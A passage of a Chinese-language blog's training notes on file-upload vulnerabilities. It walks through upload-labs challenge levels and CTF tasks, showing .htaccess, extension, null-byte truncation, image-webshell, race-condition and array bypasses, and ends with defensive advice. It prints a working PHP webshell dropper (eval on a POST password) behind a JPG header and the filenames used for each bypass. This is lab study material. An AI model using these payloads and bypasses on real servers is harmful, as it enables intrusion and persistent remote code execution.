<li>试上传前 3 关能用的后缀：<code>shell.php</code>（提示禁止）、<code>shell.php5</code>（禁止）、<code>shell.phtml</code>（禁止）—— 几乎所有 PHP 相关后缀都被拦了；</li>
<li>试上传正常图片 <code>test.jpg</code>（成功），改 MIME 上传 <code>shell.php</code>（还是禁止）—— 说明不校验 MIME，只严格拦后缀黑名单。</li>
<li>直接看回显。</li>
</ul>
<p><strong>漏洞关键：.htaccess 文件（Apache 服务器专属 “配置文件”）</strong></p>
<ul>
<li><code>.htaccess</code> 是 Apache 服务器的 “目录级配置文件”，作用是：控制当前目录及子目录的文件解析规则；</li>
<li>Pass-4 的黑名单没禁 <code>.htaccess</code>（这是核心漏洞），咱们上传一个自定义的 <code>.htaccess</code>，告诉服务器：“这个目录里所有文件，不管后缀是什么，都按 PHP 解析！”；</li>
<li>后续再上传一个 “后缀合法但藏了木马” 的文件（比如 <code>shell.jpg</code>），服务器会因为 <code>.htaccess</code> 的配置，把它当成 PHP 代码执行！</li>
</ul>
<h3 id="pass-04-实验举例"><a href="#pass-04-实验举例" class="headerlink" title="pass-04 实验举例"></a>pass-04 实验举例</h3><p>查看源码,看到本题:</p>
<p><img src="/images/GSAXbCx5AovpIBxqImKc2zOnnZg.png"></p>
<p>我们新建一个 <code>.htaccess</code> 配置文件,告诉 Apache 服务器，所有 <code>.jpg</code> 后缀的文件，都按 PHP 代码解析.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>先上传 <code>.htaccess</code> 文件,再上传一个木马 jpg 文件,用蚁剑读后台发现都传上去了</p>
<p><img src="/images/CXDGbhm67oV5BZx8AFVccVn4nbh.png"></p>
<p>读 muma4.jpg,发现失败了,注意文件名需要只含有拓展名</p>
<p><img src="/images/H5V4bbNUYoccFyxTG63c98gGn0b.png"></p>
<p>再次读 muma4,运行通过</p>
<p><img src="/images/JRg4bJakXoYJVmxIZ8kct6kQnhh.png"></p>
<h2 id="黑名单-绕过-“联合过滤”"><a href="#黑名单-绕过-“联合过滤”" class="headerlink" title="[黑名单]绕过 “联合过滤”"></a>[黑名单]绕过 “联合过滤”</h2><p><strong>怎么判断是 “多重过滤”？</strong></p>
<ul>
<li>试 Pass-6 的 “末尾空格”（<code>shell.php </code>）→ 被拦（过滤空格）；</li>
<li>试 Pass-7 的 “末尾点”（<code>shell.php.</code>）→ 被拦（过滤末尾点）；</li>
<li>试 Pass-8 的 “<code>::$DATA</code>”（<code>shell.php::$DATA</code>）→ 被拦（过滤特殊标识）；</li>
<li>试单一变种后缀（<code>.php5</code>）、大小写（<code>.PhP</code>）→ 被拦（黑名单 + 大小写过滤）；</li>
<li>但试 “<code>shell.php. .</code>”（.php 后面加「点 + 空格 + 点」）→ 能放行！</li>
</ul>
<p><strong>漏洞关键：Windows 文件名 “多重过滤绕过”</strong></p>
<p>Windows 处理文件名时，会按 “从后到前” 的顺序自动去除 <strong>末尾的点、空格</strong>，但不会一次性过滤 “点 + 空格 + 点” 的组合：</p>
<ul>
<li>你上传的文件名叫 <code>shell.php. .</code>（注意：<code>.php</code> 后面是「英文点 + 英文空格 + 英文点」）；</li>
<li>服务器校验时，会把文件名当成 <code>shell.php. .</code>（后缀是 <code>.php. .</code>，不在黑名单里，直接放行）；</li>
<li>保存时，Windows 会先去掉最后一个点 → 变成 <code>shell.php. </code>（带点 + 空格）；</li>
<li>再自动去掉末尾的空格 → 变成 <code>shell.php.</code>（带点）；</li>
<li>最后去掉末尾的点 → 最终还原成 <code>shell.php</code>（能正常解析 PHP）；</li>
<li>相当于 “用组合符号骗过程序校验，再让系统自动还原成合法恶意文件名”。</li>
</ul>
<h3 id="pass-09-实验举例"><a href="#pass-09-实验举例" class="headerlink" title="pass-09 实验举例"></a>pass-09 实验举例</h3><p>我们打开源码，发现确实这些都给过滤了…所以我们需要构造一个文件名进行多重过滤绕过</p>
<p><img src="/images/OxwwbvGgGokkhAxEAHTc5N9CnJe.png"></p>
<p>我们构造一个末尾是.php.空格.,来读读代码</p>
<p>这里先删除文件名末尾的点,只会删除空格之后,也就是末尾的一个点,接着首尾去空,把空格删去,最后检测文件名剩下.php.,它并不是被禁用的格式,因而上传成功</p>
<p><img src="/images/WwKWbagktooGf6xwQNLcZOYjnig.png"></p>
<p>这里我们可能不清楚上传的文件到底要怎么访问,因为删去的文件名有点乱,可以直接右键获取图片地址再访问即可</p>
<p><img src="/images/UsiEbCzAQoMrYqxtybVcyM0Tn2l.png"></p>
<h2 id="黑名单-双写后缀绕过（黑名单-单次字符过滤）"><a href="#黑名单-双写后缀绕过（黑名单-单次字符过滤）" class="headerlink" title="[黑名单]双写后缀绕过（黑名单 + 单次字符过滤）"></a>[黑名单]双写后缀绕过（黑名单 + 单次字符过滤）</h2><p><strong>判断校验规则（做 3 个小实验）</strong></p>
<ul>
<li>实验 1：上传 <code>shell.php</code> → 提示 “不允许上传该类型文件”（.php 在黑名单）；</li>
<li>实验 2：上传 <code>shell.phphp</code> → 还是被拦（服务器把中间的 “php” 删掉，变成 <code>shell.php</code>，依然触发黑名单）；</li>
<li>实验 3：上传 <code>shell.pphphp</code> → 放行！（服务器删掉中间的 “php”，变成 <code>shell.php</code>，但校验时识别的是 <code>pphphp</code> 后缀，不在黑名单）。</li>
</ul>
<p><strong>漏洞关键：服务器的 “单次替换” 逻辑</strong></p>
<ul>
<li>咱们构造 <code>pphphp</code> → 服务器单次替换 “php” 后，变成 <code>php</code>（刚好是能解析的后缀）；</li>
<li>校验时，服务器看到的是 <code>pphphp</code>（不在黑名单），放行；保存后实际是 <code>shell.php</code>，能正常解析 PHP。</li>
</ul>
<h3 id="pass-10-实验举例"><a href="#pass-10-实验举例" class="headerlink" title="pass-10 实验举例"></a>pass-10 实验举例</h3><p>我们打开源代码，发现原本的文件名检测变成了把黑名单中的文件名直接替换成空，而且不构成循环，只替换一次</p>
<p><img src="/images/PNY2bKYSCoQU2BxTQWVcL85mnie.png"></p>
<p>读一读上一关的代码，是直接检测，检测到了就无法上传了</p>
<p><img src="/images/RrTnbUcPvoZj7jx9mm9cm0UtnBb.png"></p>
<p>那直接像 SQL 注入那样双写,点放行</p>
<p><img src="/images/K5EgbkOreoPQD2xApMvc8WLmnSd.png"></p>
<p>显示上传成功</p>
<p><img src="/images/JZFUbybfwokcccxzwp9c03L0nWb.png"></p>
<p>我们右键获取文件地址并访问,文件名自动变成.php 了,运行通过</p>
<p><img src="/images/MxHybNc6goU5eGxhiX5ciaT3n4b.png"></p>
<h2 id="白名单-GET-参数-00-空字符截断（白名单-只检测拓展名-拼接保存）"><a href="#白名单-GET-参数-00-空字符截断（白名单-只检测拓展名-拼接保存）" class="headerlink" title="[白名单]GET 参数 %00 空字符截断（白名单&#x2F;只检测拓展名 + 拼接保存）"></a>[白名单]GET 参数 %00 空字符截断（白名单&#x2F;只检测拓展名 + 拼接保存）</h2><p>Pass-11 是文件上传的重要转折点 —— 从「黑名单绕过」正式进入「白名单绕过」，核心考点是 <strong>%00</strong>** 空字符截断**（HTTP 协议特性），利用服务器 “路径拼接 + 空字符结束” 的逻辑，绕开白名单后缀校验！</p>
<p><strong>判断校验规则（做 2 个实验）</strong></p>
<ul>
<li>实验 1：上传 <code>shell.php</code> → 提示 “不允许上传该类型文件”（.php 不在白名单）；</li>
<li>实验 2：上传 <code>test.jpg</code> → 成功上传（.jpg 在白名单：.jpg&#x2F;.png&#x2F;.gif）；</li>
<li>结论：服务器是「白名单校验」（只允许指定图片后缀），且校验的是 “文件名后缀”。</li>
</ul>
<p><strong>漏洞关键：%00 空字符的 “截断特性”</strong></p>
<p>Pass-11 后端保存文件的核心逻辑（简化版）：</p>
<p>php</p>
<p>运行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$save_path</span> = <span class="string">&quot;./uploads/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; <span class="comment">// 拼接“上传目录+GET参数传的文件名”</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(获取文件后缀(<span class="variable">$save_path</span>), $白名单)) &#123; <span class="comment">// 检查后缀是否在白名单</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(..., <span class="variable">$save_path</span>); <span class="comment">// 保存文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>%00</code> 是 HTTP 协议中的「空字符」，在 ASCII 表中编码是 0x00，代表 “字符串结束”；</p>
</li>
<li><p>当我们给 GET 参数传 <code>filename=shell.php%00.jpg</code> 时：</p>
<ol>
<li>校验阶段：服务器识别后缀是 <code>.jpg</code>（在白名单），放行；</li>
<li>保存阶段：服务器遇到 <code>%00</code> 就停止解析，实际保存路径变成 <code>./uploads/shell.php</code>（后面的 <code>.jpg</code> 被截断）；</li>
</ol>
</li>
<li><p>最终效果：用 <code>.jpg</code> 过白名单，实际保存的是 <code>.php</code> 木马文件！</p>
</li>
</ul>
<h3 id="pass-11-实验举例-传路径"><a href="#pass-11-实验举例-传路径" class="headerlink" title="pass-11 实验举例(传路径)"></a>pass-11 实验举例(传路径)</h3><p>其实 %00 的可行是存在条件的,不然前面的题目都可以用 %00.我们读一下代码先</p>
<p><img src="/images/Tl9Pb2NVGoe6uUxW6DFcpivBnff.png"></p>
<p>发现这里是先把文件拓展名给拿出来,单独检查文件拓展名,再拼接保存</p>
<p>这样我们只要保证拓展名在白名单中就可以了.</p>
<p>但是第十关之前,是检查整个文件名,只要含 php 就会出问题.</p>
<p>这里试了一下传木马的时候加个 %00.jpg,能成功上传,但读文件的时候失败了,蚁剑也提示上传的是 jpg</p>
<p><img src="/images/GBhSbdyJBoZ8qLx04a6c1GlVn1c.png"></p>
<p>所以我们尝试修改上传的路径,点放行</p>
<p><img src="/images/SZdKb2MPio5Uvfxoz12ckU8Pnfg.png"></p>
<p>放行成功,点获取地址后运行通过</p>
<h2 id="白名单-POST-参数-0x00-十六进制截断（白名单进阶）"><a href="#白名单-POST-参数-0x00-十六进制截断（白名单进阶）" class="headerlink" title="[白名单]POST 参数 0x00 十六进制截断（白名单进阶）"></a>[白名单]POST 参数 0x00 十六进制截断（白名单进阶）</h2><p><strong>关键原理：</strong></p>
<p>POST 请求的参数放在「请求体」中，而非 URL，服务器不会主动解码 <code>%00</code>—— 比如你直接写 <code>filename=shell.php%00.jpg</code>，服务器会当成 <code>shell.php%00.jpg</code> 处理（<code>%00</code> 是两个字符：<code>%</code> 和 <code>00</code>），无法截断；而十六进制 <code>00</code> 是「空字符的原始二进制编码」，服务器会直接识别为 “字符串结束”，从而触发截断。</p>
<h3 id="pass-12-实验举例-post-传路径"><a href="#pass-12-实验举例-post-传路径" class="headerlink" title="pass-12 实验举例(post 传路径)"></a>pass-12 实验举例(post 传路径)</h3><p>我们打开 burp suite 进行抓包，上传脚本文件。修改 save_path 值，在“upload&#x2F;”后面加上“xxx.php a”，这里的“a”仅仅是为了显示空格。修改 filename 中的后缀名为合法后缀名。</p>
<p><img src="/images/KxSWbgJ8ooEuSwxnz73cDnUanZf.png"></p>
<p>然后进行关键一步，打开 Hex 选项修改十六进制码，找到“shell.php a”的位置，将空格对应的十六进制码“20”改成“00”。修改后发送数据包</p>
<p><img src="/images/L80rbZOrOoN7N1xyQIAczalPnpd.png"></p>
<p>接下来就是访问文件了，操作和上一关是一样的。</p>
<h2 id="图片马-绕过-“文件幻术头校验”"><a href="#图片马-绕过-“文件幻术头校验”" class="headerlink" title="[图片马]绕过 “文件幻术头校验”"></a>[图片马]绕过 “文件<strong>幻术头</strong>校验”</h2><p><strong>关键原理：</strong></p>
<p>jpg 文件有它特定的”文件幻术头”,长度为 2*3 个字符,当本关检测的是文件幻术头时,需要用一张真正的 jpg 图片(它带有幻术头),使用软件把恶意代码嵌入进去(这里需要使用工具 UltraEdit),再执行.</p>
<p>注意:嵌入后的图片没办法用直接访问的方式执行,需要搭配文件包含,这是”文件马”类题的特点</p>
<h3 id="pass-13-实验举例"><a href="#pass-13-实验举例" class="headerlink" title="pass-13 实验举例"></a>pass-13 实验举例</h3><p>读代码,发现是文件幻术头的检测,只有真正的 jpg 图片才有文件幻术头.</p>
<p><img src="/images/L4Nkb9d9aoRpLWxbyeEcsvwbnob.png"></p>
<p>我们用工具打开一张 jpg 图片,观察文本编辑,第一行前六个字符就是所谓”文件幻术头”</p>
<p><img src="/images/JCmObDCTwoBfrHxvbIecDdS6n0g.png"></p>
<p>我们直接编辑右边的非转码文字,将恶意代码嵌入,左边会自动转码.而后上传通过检测</p>
<p><img src="/images/NJPObeHQSobtc7xrQpQcQrjSngd.png"></p>
<p>上传发现并不报错,点击获取图片地址,用文件包含的形式打开(本关应当提供),代码就被执行了</p>
<p><img src="/images/HayhbBY9SoB6wmxoyIHcb1mmn1e.png"></p>
<h3 id="pass-14-15-实验说明"><a href="#pass-14-15-实验说明" class="headerlink" title="pass-14&#x2F;15 实验说明"></a>pass-14&#x2F;15 实验说明</h3><p>对比 13 关,检查字节</p>
<p><img src="/images/WToObcioToj1QmxzUuvcFJYAnce.png"></p>
<p><img src="/images/KGZPbgNRioTidexEGOwcIo0dnlg.png"></p>
<p>14 关使用了 getimagesize()函数,但是和 pass13 拥有相同做法</p>
<p><img src="/images/QxpZblUvlomU6Dxzl70cEFYNnqi.png"></p>
<p>不过要注意的是 这些函数有的想 return true 有别的要求,所以有的时候 jpg 不行换 png,注意他会自动改文件名,要右击图片来获取地址</p>
<p>15 关同理,用的是 <code>exif_imagetype()</code></p>
<ul>
<li><code>getimagesize()</code>（Pass-14）：检测文件头 + 基础图片结构并返回尺寸等信息，仅认真图片，忽略尾部内容；</li>
<li><code>exif_imagetype()</code>（Pass-15）：严格校验图片文件头标识，仅返回图片类型，同样忽略尾部附加内容。</li>
</ul>
<p><img src="/images/L6TQb7pFJo3QKPxSUsrc2ck9nmc.png"></p>
<h2 id="图片马-绕过-“图片二次处理-真图片校验”"><a href="#图片马-绕过-“图片二次处理-真图片校验”" class="headerlink" title="[图片马]绕过 “图片二次处理 + 真图片校验”"></a>[图片马]绕过 “图片二次处理 + 真图片校验”</h2><p>Pass-16 是进阶强化关 —— 后端不仅用 <code>exif_imagetype()</code> 做真图片校验，还会对上传图片做 <strong>二次处理</strong>（如压缩、裁剪、格式转换），直接在尾部嵌代码会被处理工具 “清空”，核心思路是 “用比较工具比较二次处理前后什么是不变的，把代码插入不变的区域”（二次处理不会清洗注释区内容）。</p>
<h3 id="pass-16-实验举例"><a href="#pass-16-实验举例" class="headerlink" title="pass-16 实验举例"></a>pass-16 实验举例</h3><p>先把被渲染的图片下载下来，直接右键图片，点击“另存图像为”,再将两个图像使用 010 工具中的比较文件打开</p>
<p><img src="/images/HPnrbVxMRoVPrBxEAs2crPzFn6e.png"></p>
<p>将被渲染后的图片与原来的图片进行对比，利用工具可以明显的看到渲染前后图像文件的异同</p>
<p><img src="/images/YcljbY7DZonGPixNxg7cbyvpnzd.png"></p>
<p>写入一句话木马,保存再上传即可</p>
<p><img src="/images/Ueg4btZPioAciYxN6a4clW6Un8d.png"></p>
<h2 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h2><p>定义：条件竞争漏洞（Race condition）官方概念是——竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。这个漏洞存在于操作系统、数据库、web 等多个层面，像有名的脏牛（dirty cow）。</p>
<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
<h3 id="pass-17-实验举例"><a href="#pass-17-实验举例" class="headerlink" title="pass-17 实验举例"></a>pass-17 实验举例</h3><p>读代码 发现源码存在临时文件,因而可能存在条件竞争漏洞</p>
<p><img src="/images/P8afbTeV6oDkrOxRZErc1EhknZK.png"></p>
<p>这里用 Burp 实验并没有做成功,用蚁剑查后台文件看到上传成功了,贴一个别人成功了的文章吧</p>
<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/24/0910/17/83536423_1133653212.shtml">http://www.360doc.com/content/24/0910/17/83536423_1133653212.shtml</a></p>
<p>注意 burp 设置,改线程等</p>
<p><strong>另外 AI 说可以在上传的 php 中构造恶意文件，然后一直访问上传的文件，访问成功了也会生成永久文件，也是一个思路.</strong></p>
<ol>
<li>新建 <code>shell.php</code>，内容：<code>&lt;?php file_put_contents(&#39;shell2.php&#39;,&#39;&lt;?php @eval($_POST[&quot;mima&quot;]);?&gt;&#39;);?&gt;</code>（执行后生成新的持久恶意文件）；</li>
<li>给文件加 JPG 文件头，改后缀为 <code>shell.jpg</code>（过白名单）：</li>
<li>plaintext</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF</span><br><span class="line">&lt;?php file_put_contents(&#x27;shell2.php&#x27;,&#x27;&lt;?php @eval($_POST[&quot;mima&quot;]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="pass-18-实验说明"><a href="#pass-18-实验说明" class="headerlink" title="pass-18 实验说明"></a>pass-18 实验说明</h3><p>本关是图片马和条件竞争漏洞结合,会检测图片的幻术头,我们必须用图片爆破而非 php 脚本,同时读文件时要用文件包含</p>
<h3 id="pass-19-实验说明"><a href="#pass-19-实验说明" class="headerlink" title="pass-19 实验说明"></a>pass-19 实验说明</h3><p><img src="/images/QzWGbTsyYoOQqpxD6G4cY7xJnng.png"></p>
<p>对后缀名的检测,使用 pass-3 下方的任意一种绕过方式均可</p>
<p><img src="/images/VSDcbz4RCobPxnx4R6Kc7DTjnig.png"></p>
<p><img src="/images/UjiwbGQz9oC2G3xfNO8cf86rnRe.png"></p>
<h2 id="数组绕过-pass-20-实验举例"><a href="#数组绕过-pass-20-实验举例" class="headerlink" title="数组绕过 |pass-20 实验举例"></a><strong>数组绕过 |pass-20 实验举例</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line">    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line">​</span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br></pre></td></tr></table></figure>

<p>源码逻辑：</p>
<ol>
<li>检查 MIME （通过抓包改 Content-Type 绕过）</li>
<li>判断 POST 参数 save_name 是否为空，</li>
<li>判断 $file 是否为数组，不是数组以 <code>.</code> 分割化为数组</li>
<li>取 $file 最后一个元素，作为文件后缀进行检查</li>
<li>取 $file 第一位和第<code>$file[count($file) - 1]</code> 作为文件名和后缀名保存文件</li>
</ol>
<p>故：</p>
<p>上传 <code>webshell.php</code>, 修改 <code>save_name</code> 为数组 绕过对$file 的切割，最后$file 最后一个元素是 <code>save_name[2] = jpg</code> 绕过后缀检测 ， 然后 <code>reset($file) = webshell.php</code></p>
<p><code>$file[1]</code> 没有定义为空，<code>count($file)</code> 的值为 <code>$file[count($file) - 1]</code> &#x3D; <code>$file[1]</code></p>
<p>所以最后上传的文件为 <code>webshell.php</code></p>
<h2 id="文件上传总结"><a href="#文件上传总结" class="headerlink" title="文件上传总结"></a><strong>文件上传总结</strong></h2><p>允许用户上传文件是司空见惯的事，只要采取正确的预防措施，就不一定会有危险。一般来说，保护您自己的网站免受这些漏洞影响的最有效方法是实施以下所有做法：</p>
<ul>
<li>根据允许扩展名的白名单而不是禁止扩展名的黑名单检查文件扩展名</li>
<li>确保文件名不包含任何可能被解释为目录或遍历序列 ( ..&#x2F;) 的子字符串。</li>
<li>重命名上传的文件以避免可能导致现有文件被覆盖的冲突。</li>
<li>在完全验证之前不要将文件上传到服务器的永久文件系统。</li>
<li>尽可能使用已建立的框架来预处理文件上传，而不是尝试编写自己的验证机制。</li>
</ul>
<p>文件上传漏洞一般是一对一的,白名单有白名单的解法，黑名单&#x2F;图片马也有各自的解法，通过代码审计，可以实现解法漏洞一对一以完成解题</p>
<h1 id="Week6-3-实验-文件上传漏洞实战"><a href="#Week6-3-实验-文件上传漏洞实战" class="headerlink" title="*[Week6.3]实验:文件上传漏洞实战"></a>*[Week6.3]实验:文件上传漏洞实战</h1><h2 id="文件上传靶场-1-20"><a href="#文件上传靶场-1-20" class="headerlink" title="文件上传靶场 1-20"></a>文件上传靶场 1-20</h2><p>见 6.2 节</p>
<h2 id="ctf-Week2-Only-Picture-Up"><a href="#ctf-Week2-Only-Picture-Up" class="headerlink" title="?ctf [Week2] Only Picture Up"></a>?ctf [Week2] Only Picture Up</h2><p>来到题目,看提示是一个白名单漏洞,于是尝试 %00 空字符截断绕过白名单.</p>
<p><img src="/images/QkQQbCB6Eo6tdgxXLFgcDTijnpf.png"></p>
<p>编写一个连接密码为 mima 的命令执行函数,以便后续蚁剑连接.</p>
<p><img src="/images/VO7ib0TBRoLSiFx0uB0cMpyGn4d.png"></p>
<p>上传木马,发现没有途径可以改文件路径,我们选择直接改文件名</p>
<p><img src="/images/W19hbEon9ovi7Vxta3AcBHROnBc.png"></p>
<p>这里直接提示上传成功,点 direct link 它执行失败了,但 preview 可以正常运行代码</p>
<p><img src="/images/Ln9cbZVYbozOJEx3vYecIKGTnuc.png"></p>
<p><img src="/images/F3vDbCYAtoVOwExfFDNcJKcwnMb.png"></p>
<p>提示本行自己敲的 flag,证明代码成功运行了,复制现在的网址,用蚁剑连接,输入连接密码,即变量名 mima</p>
<p><img src="/images/RrodbwjZKoO45rxp5jNcJKMdngf.png"></p>
<p>添加数据后点进去,打开网站的文档库,发现旗帜位于根目录下的一个文档中.</p>
<p><img src="/images/SJtRb6L2ho8pTyxbqNDch0FFnjh.png"></p>
<p><img src="/images/Wngdbs6HYo7hPpxwICDc9YxVn8g.png"></p>
<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>白名单的题你既可以改路径,又可以改文件名,只要是正确的 %00 截断,都可以运行通过</p>
<h2 id="我只想要你的-PNG！-不会做"><a href="#我只想要你的-PNG！-不会做" class="headerlink" title="我只想要你的 PNG！(不会做)"></a>我只想要你的 PNG！(不会做)</h2><p>一进来就是开拓者啊，令人眼前一亮</p>
<p>本题没给任何提示，令人眼前一黑！</p>
<p><img src="/images/N7h6bxtHPo9j1pxS5Uics168nie.png"></p>
<p>传了个 php,他说只有 png 才能用,猜测是白名单</p>
<p><img src="/images/Ch0WbNaSyow7mJx1DrVcBBl1nMb.png"></p>
<p>那还是试试 %00 截断吧</p>
<p><img src="/images/X6GEbjJHloAslTxNIDmcYndPnxr.png"></p>
<p>点放行,自己改名了</p>
<p><img src="/images/TtjEbXdB4oU4ZMxBfCfczuZgnde.png"></p>
<p>尝试访问,直接报错</p>
<p><img src="/images/IyVqbltdZoCzmyxcUldcYhrfnvb.png"></p>
<p>打开网页源代码,发现有个 check.php</p>
<p><img src="/images/TD7BbfhACoMrA4xUL2YclxXdnpb.png"></p>
<p>访问一下,执行的貌似是 ls，这些文件似乎都没有被改名</p>
<p><img src="/images/SaNPbu1HPoJ6AzxjqJ2c9JOJnyb.png"></p>
<p><img src="/images/OZIdbkYk5oEln6x9LJgc24FBnrf.png"></p>
<p>又试了下十六进制截断,还是不行,没辙了啊.这咋整</p>
<p>然后还试了试访问根目录下的文件,貌似这是个文件名拼接(?,但是访问也不成功，换了个环境让文件名不那么长，还是不成功，那不会了…下一题吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/11/18/%E7%AC%AC%E4%BA%94%E7%AB%A0-SSTI%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/%E7%AC%AC%E4%BA%94%E7%AB%A0-SSTI%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">第五章-SSTI注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-11-18 12:00:00" itemprop="dateCreated datePublished" datetime="2025-11-18T12:00:00+08:00">2025-11-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:48:15" itemprop="dateModified" datetime="2026-01-21T01:48:15+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这一章因为格式问题实在是转化不了md<br>去飞书看吧<br><a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/VGvfwHIDkipsS7krwejcntfRnmf?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/VGvfwHIDkipsS7krwejcntfRnmf?from=from_copylink</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">legend1440</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
